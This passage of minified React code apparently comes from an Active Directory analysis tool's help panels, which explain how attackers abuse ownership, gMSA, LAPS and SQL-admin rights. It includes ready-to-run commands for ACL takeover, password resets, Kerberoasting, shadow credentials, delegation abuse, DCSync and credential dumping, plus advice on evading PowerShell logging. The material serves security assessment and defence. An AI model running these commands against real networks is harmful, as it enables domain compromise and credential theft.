",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsx(t,{variant:"body1",children:" Cleanup "}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsx(t,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Passwords "}),e.jsxs(t,{variant:"body2",children:["If FullControl (GenericAll) is obtained on the domain, instead of granting DCSync rights, the AllExtendedRights privilege included grants ",n," enough privileges to retrieve LAPS passwords domain-wise."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a GPO, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});default:return null}},Qc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),e.jsx(t,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),e.jsx(t,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),Zc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm",children:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"})]}),ed={general:Yc,windowsAbuse:Jc,linuxAbuse:Xc,opsec:Qc,references:Zc},td=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[a," is a Group Managed Service Account. The ",I(r)," ",n," can retrieve the password for the GMSA ",a,"."]}),e.jsx(t,{variant:"body2",children:"Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute)."}),e.jsx(t,{variant:"body2",children:"The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA."})]}),nd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."}),e.jsx(t,{variant:"body2",children:'If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).'}),e.jsx(t,{variant:"body2",children:"Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:"}),e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"Build GMSAPasswordReader.exe from its source: https://github.com/rvazarkar/GMSAPasswordReader"})}),e.jsx(y,{children:e.jsx(f,{children:"Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assembly"})}),e.jsx(y,{children:e.jsx(f,{children:'Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the "old" password and one for the "current" password. It is possible that either value is valid:'})})]}),e.jsx(t,{component:"pre",children:"gmsapasswordreader.exe --accountname gmsa-jkohler"}),e.jsx(t,{variant:"body2",children:"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."})]}),rd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."}),e.jsx(t,{variant:"body2",children:'If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).'}),e.jsxs(t,{variant:"body2",children:["Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/micahvandeusen/gMSADumper",children:"gMSADumper.py"})," ","can be used for that purpose."]}),e.jsx(t,{component:"pre",children:"gMSADumper.py -u 'user' -p 'password' -d 'domain.local'"}),e.jsx(t,{variant:"body2",children:"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."})]}),od=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`When abusing a GMSA that is already logged onto a system, you will have the same opsec considerations as when abusing a standard user logon. For more information about that, see the "HasSession" modal's opsec considerations tab.`}),e.jsx(t,{variant:"body2",children:"When retrieving the GMSA password from Active Directory, you may generate a 4662 event on the Domain Controller; however, that event will likely perfectly resemble a legitimate event if you request the password from the same context as a computer account that is already authorized to read the GMSA password."})]}),ad=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/",children:"https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.powershellgallery.com/packages/DSInternals/",children:"https://www.powershellgallery.com/packages/DSInternals/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd",children:"https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=36",children:"https://adsecurity.org/?p=36"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=2535",children:"https://adsecurity.org/?p=2535"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword"})]}),sd={general:td,windowsAbuse:nd,linuxAbuse:rd,opsec:od,references:ad},id=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:'The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute, "ms-mcs-AdmPwd".'})]}),cd=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Get-DomainObject, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Get-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Get-DomainObject, optionally specifying $Cred if you are not already running a process as"," ",n,":"]}),e.jsx(t,{component:"pre",children:'Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name'})]}),dd=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Sufficient control on a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]}),ld=()=>e.jsx(t,{variant:"body2",children:"Reading properties from LDAP is an extremely low risk operation."}),hd=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf",children:"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=3164",children:"https://adsecurity.org/?p=3164"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword"})]}),pd={general:id,windowsAbuse:cd,linuxAbuse:dd,opsec:ld,references:hd},ud=({sourceName:n,targetName:r})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The user ",n," is a SQL admin on the computer ",r,"."]}),e.jsxs(t,{variant:"body2",children:["There is at least one MSSQL instance running on ",r," where the user ",n," is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques."]}),e.jsx(t,{variant:"body2",children:'For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.'}),e.jsx(t,{variant:"body2",children:"Author: Scott Sutherland"})]}),md=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["Scott Sutherland (",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://twitter.com/_nullbind",children:"@nullbind"}),") from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://twitter.com/egru",children:"@egru"}),"), and Thomas Elling (",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/thomaselling",children:"@thomaselling"}),"). Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell instance. Get PowerUpSQL here:"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/NetSPI/PowerUpSQL",children:"https://github.com/NetSPI/PowerUpSQL"}),"."]}),e.jsx(t,{variant:"body1",children:"Finding Data"}),e.jsx(t,{variant:"body2",children:"Get a list of databases, sizes, and encryption status:"}),e.jsx(t,{component:"pre",children:"Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults"}),e.jsx(t,{variant:"body2",children:"Search columns and data for keywords:"}),e.jsx(t,{component:"pre",children:'Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize'}),e.jsx(t,{variant:"body1",children:"Executing Commands"}),e.jsx(t,{variant:"body2",children:"Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges."}),e.jsx(t,{variant:"body2",children:"xp_cmdshell Execute Example:"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"Agent Job Execution Examples:"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\\instance -username myuser -password mypassword'}),e.jsx(t,{component:"pre",children:`Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword`}),e.jsx(t,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"}),e.jsx(t,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"}),e.jsx(t,{variant:"body2",children:"Python Subsystem Execution:"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"R subsystem Execution Example"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"OLE Execution 